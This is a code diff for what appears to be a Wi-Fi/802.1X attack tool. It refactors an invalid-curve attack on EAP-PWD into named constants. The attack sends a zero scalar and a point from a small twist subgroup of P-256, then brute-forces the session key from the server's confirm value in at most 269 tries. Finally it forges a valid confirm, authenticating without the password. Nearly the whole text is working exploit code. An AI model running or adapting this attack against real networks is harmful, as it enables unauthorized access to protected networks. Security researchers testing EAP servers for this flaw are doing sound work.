@@ -68,20 +68,26 @@ static constexpr array<uint8_t, 32> TWIST_N = {
 static constexpr array<uint8_t, 4> CIPHERSUITE = { 0x00, 0x13, 0x01, 0x01 };
 // clang-format on
 
+static constexpr size_t COORD      = 32;            // P-256 field element / coordinate
+static constexpr size_t POINT      = COORD * 2;     // uncompressed (x, y) point
+static constexpr size_t COMMIT     = POINT + COORD; // elem(64) + scalar(32)
+static constexpr int    TWIST_ORD  = 269;           // subgroup order of the quadratic twist of P-256
+static constexpr size_t PWD_FRAME_HDR = 2;          // EAP-PWD overhead: type(1) + opcode(1)
+
 // EAP-PWD H function: HMAC-SHA256 with a 32-byte all-zero key (RFC 5931 $2.4)
-static array<uint8_t, 32> H(const uint8_t *data, const size_t len) {
-	static constexpr uint8_t zero_key[32] = {};
-	array<uint8_t, 32> out{};
-	unsigned int out_len = 32;
-	HMAC(EVP_sha256(), zero_key, 32, data, len, out.data(), &out_len);
+static array<uint8_t, COORD> H(const uint8_t *data, const size_t len) {
+	static constexpr uint8_t zero_key[COORD] = {};
+	array<uint8_t, COORD> out{};
+	auto out_len = static_cast<unsigned int>(out.size());
+	HMAC(EVP_sha256(), zero_key, sizeof(zero_key), data, len, out.data(), &out_len);
 	return out;
 }
 
 // Compute EAP-PWD confirm: H(k_x | e1_xy | s1 | e2_xy | s2 | ciphersuite)
-static array<uint8_t, 32> pwd_confirm(const array<uint8_t, 32> &k_x, const array<uint8_t, 64> &e1,
-	const array<uint8_t, 32> &s1, const array<uint8_t, 64> &e2, const array<uint8_t, 32> &s2) {
+static array<uint8_t, COORD> pwd_confirm(const array<uint8_t, COORD> &k_x, const array<uint8_t, POINT> &e1,
+	const array<uint8_t, COORD> &s1, const array<uint8_t, POINT> &e2, const array<uint8_t, COORD> &s2) {
 	vector<uint8_t> buf;
-	buf.reserve(32 + 64 + 32 + 64 + 32 + 4);
+	buf.reserve(k_x.size() + e1.size() + s1.size() + e2.size() + s2.size() + CIPHERSUITE.size());
 	auto app = [&](const auto &a) { buf.insert(buf.end(), a.begin(), a.end()); };
 	app(k_x);
 	app(e1);
@@ -95,18 +101,20 @@ static array<uint8_t, 32> pwd_confirm(const array<uint8_t, 32> &k_x, const array
 // Build EAPOL-EAP response: EAPOL header + EAP code/id/len + TYPE_PWD | opcode | payload
 static frame_raw_t make_pwd_eapol(
 	const uint8_t eap_id, const uint8_t opcode, const uint8_t *payload, const size_t len) {
-	const auto eap_body = static_cast<uint16_t>(2 + len); // TYPE_PWD + opcode + payload
-	const auto eap_len = static_cast<uint16_t>(4 + eap_body);
+	const auto eap_body = static_cast<uint16_t>(PWD_FRAME_HDR + len);
+	const auto eap_len  = static_cast<uint16_t>(EAP_HDR_SIZE + eap_body);
 	frame_raw_t eapol_f;
-	eapol_f.reserve(4 + eap_len);
-	eapol_f.push_back(0x01); // EAPOL version
-	eapol_f.push_back(0x00); // EAPOL type: EAP
-	eapol_f.push_back(static_cast<uint8_t>(eap_len >> 8));
-	eapol_f.push_back(static_cast<uint8_t>(eap_len & 0xff));
+	eapol_f.reserve(EAPOL_HDR_SIZE + eap_len);
+	const auto push_be16 = [&](uint16_t v) {
+		eapol_f.push_back(static_cast<uint8_t>(v >> 8));
+		eapol_f.push_back(static_cast<uint8_t>(v));
+	};
+	eapol_f.push_back(EAPOL_VERSION);
+	eapol_f.push_back(EAPOL_EAP);
+	push_be16(eap_len);
 	eapol_f.push_back(CODE_RESPONSE);
 	eapol_f.push_back(eap_id);
-	eapol_f.push_back(static_cast<uint8_t>(eap_len >> 8));
-	eapol_f.push_back(static_cast<uint8_t>(eap_len & 0xff));
+	push_be16(eap_len);
 	eapol_f.push_back(TYPE_PWD);
 	eapol_f.push_back(opcode);
 	eapol_f.insert(eapol_f.end(), payload, payload + len);
@@ -116,15 +124,15 @@ static frame_raw_t make_pwd_eapol(
 // Brute-force the shared k_x by trying all subgroup multiples (<= 269 iterations).
 // server_confirm = H(k_x | server_elem | server_scal | our_elem | 0^32 | ciphersuite)
 // names of params from rfc5931
-static optional<array<uint8_t, 32>> brute_force_k(
-	const array<uint8_t, 64> &Element_S, const array<uint8_t, 32> &Scalar_S, const array<uint8_t, 32> &Confirm_S) {
+static optional<array<uint8_t, COORD>> brute_force_k(
+	const array<uint8_t, POINT> &Element_S, const array<uint8_t, COORD> &Scalar_S, const array<uint8_t, COORD> &Confirm_S) {
 	BN_CTX *ctx = BN_CTX_new();
-	BIGNUM *p = BN_bin2bn(FIELD_P.data(), 32, nullptr);
-	BIGNUM *a = BN_bin2bn(TWIST_A.data(), 32, nullptr);
-	BIGNUM *b = BN_bin2bn(TWIST_B.data(), 32, nullptr);
-	BIGNUM *n = BN_bin2bn(TWIST_N.data(), 32, nullptr);
-	BIGNUM *gx = BN_bin2bn(SUB_GX.data(), 32, nullptr);
-	BIGNUM *gy = BN_bin2bn(SUB_GY.data(), 32, nullptr);
+	BIGNUM *p  = BN_bin2bn(FIELD_P.data(), FIELD_P.size(), nullptr);
+	BIGNUM *a  = BN_bin2bn(TWIST_A.data(), TWIST_A.size(), nullptr);
+	BIGNUM *b  = BN_bin2bn(TWIST_B.data(), TWIST_B.size(), nullptr);
+	BIGNUM *n  = BN_bin2bn(TWIST_N.data(), TWIST_N.size(), nullptr);
+	BIGNUM *gx = BN_bin2bn(SUB_GX.data(),  SUB_GX.size(),  nullptr);
+	BIGNUM *gy = BN_bin2bn(SUB_GY.data(),  SUB_GY.size(),  nullptr);
 
 	EC_GROUP *grp = EC_GROUP_new_curve_GFp(p, a, b, ctx);
 	EC_POINT *gen = EC_POINT_new(grp);
@@ -135,22 +143,21 @@ static optional<array<uint8_t, 32>> brute_force_k(
 	BIGNUM *k = BN_new();
 	BIGNUM *kxb = BN_new();
 
-	array<uint8_t, 64> our_elem{};
+	array<uint8_t, POINT> our_elem{};
 	ranges::copy(SUB_GX, our_elem.begin());
-	ranges::copy(SUB_GY, our_elem.begin() + 32);
-	constexpr array<uint8_t, 32> our_scal{};
+	ranges::copy(SUB_GY, our_elem.begin() + COORD);
+	constexpr array<uint8_t, COORD> our_scal{};
 
-	optional<array<uint8_t, 32>> result;
+	optional<array<uint8_t, COORD>> result;
 
-	//TODO magic numbers
-	for(int i = 1; i < 269 && !result; i++) {
+	for(int i = 1; i < TWIST_ORD && !result; i++) {
 		BN_set_word(k, static_cast<BN_ULONG>(i));
 		EC_POINT_mul(grp, pt, nullptr, gen, k, ctx);
 		if(EC_POINT_is_at_infinity(grp, pt)) continue;
 
-		array<uint8_t, 32> kx_bytes{};
+		array<uint8_t, COORD> kx_bytes{};
 		EC_POINT_get_affine_coordinates_GFp(grp, pt, kxb, nullptr, ctx);
-		BN_bn2binpad(kxb, kx_bytes.data(), 32);
+		BN_bn2binpad(kxb, kx_bytes.data(), kx_bytes.size());
 
 		if(pwd_confirm(kx_bytes, Element_S, Scalar_S, our_elem, our_scal) == Confirm_S) result = kx_bytes;
 	}
@@ -178,8 +185,8 @@ bool run_invalid_curve_exchange(EAP_Att &eap_att) {
 	if(send_eap_normal_EAP_pwd_ID(eap_att)) return false;
 
 	// EAP-PWD-Commit: capture server commit, send scalar=0 + subgroup_gen as element
-	array<uint8_t, 64> Element_S{};
-	array<uint8_t, 32> Scalar_S{};
+	array<uint8_t, POINT> Element_S{};
+	array<uint8_t, COORD> Scalar_S{};
 	{
 		optional<EapPwdFrame> frame;
 		const auto e = wait_eapol(eap_att, get_frame(frame, PWD_OPCODE_COMMIT));
@@ -187,23 +194,23 @@ bool run_invalid_curve_exchange(EAP_Att &eap_att) {
 			log(LogLevel::WARNING, "No EAP-PWD-Commit request");
 			return false;
 		}
-		if(frame->pwd_data.size() < 96) {
+		if(frame->pwd_data.size() < COMMIT) {
 			log(LogLevel::WARNING,
 				"Server commit payload too short ({} bytes)",
 				static_cast<int>(frame->pwd_data.size()));
 			return false;
 		}
-		copy_n(frame->pwd_data.begin(), 64, Element_S.begin());
-		copy_n(frame->pwd_data.begin() + 64, 32, Scalar_S.begin());
+		copy_n(frame->pwd_data.begin(),        POINT, Element_S.begin());
+		copy_n(frame->pwd_data.begin() + POINT, COORD, Scalar_S.begin());
 
 		// payload: elem_x(32) | elem_y(32) | scalar(32=0)
-		array<uint8_t, 96> commit_payload{};
+		array<uint8_t, COMMIT> commit_payload{};
 		ranges::copy(SUB_GX, commit_payload.begin());
-		ranges::copy(SUB_GY, commit_payload.begin() + 32);
+		ranges::copy(SUB_GY, commit_payload.begin() + COORD);
 
 		// scalar stays zero
 		log(LogLevel::INFO, "Sending invalid commit (scalar=0, element=subgroup_gen)");
-		send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_COMMIT, commit_payload.data(), 96));
+		send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_COMMIT, commit_payload.data(), COMMIT));
 	}
 
 	// EAP-PWD-Confirm: brute-force k_x, compute and send our confirm
@@ -214,13 +221,13 @@ bool run_invalid_curve_exchange(EAP_Att &eap_att) {
 			log(LogLevel::WARNING, "No EAP-PWD-Confirm request");
 			return false;
 		}
-		if(frame->pwd_data.size() < 32) {
+		if(frame->pwd_data.size() < COORD) {
 			log(LogLevel::WARNING, "Server confirm payload too short");
 			return false;
 		}
 
-		array<uint8_t, 32> server_confirm{};
-		copy_n(frame->pwd_data.begin(), 32, server_confirm.begin());
+		array<uint8_t, COORD> server_confirm{};
+		copy_n(frame->pwd_data.begin(), COORD, server_confirm.begin());
 
 		log(LogLevel::INFO, "Recovering session key (brute-forcing subgroup)...");
 		const auto kx = brute_force_k(Element_S, Scalar_S, server_confirm);
@@ -230,13 +237,13 @@ bool run_invalid_curve_exchange(EAP_Att &eap_att) {
 		}
 		log(LogLevel::INFO, "Session key recovered");
 
-		array<uint8_t, 64> our_elem{};
+		array<uint8_t, POINT> our_elem{};
 		ranges::copy(SUB_GX, our_elem.begin());
-		ranges::copy(SUB_GY, our_elem.begin() + 32);
-		constexpr array<uint8_t, 32> our_scal{};
+		ranges::copy(SUB_GY, our_elem.begin() + COORD);
+		constexpr array<uint8_t, COORD> our_scal{};
 
 		const auto our_confirm = pwd_confirm(*kx, our_elem, our_scal, Element_S, Scalar_S);
-		send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_CONFIRM, our_confirm.data(), 32));
+		send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_CONFIRM, our_confirm.data(), COORD));
 	}
 
 	return eap_pwd_wait_for_success(eap_att);
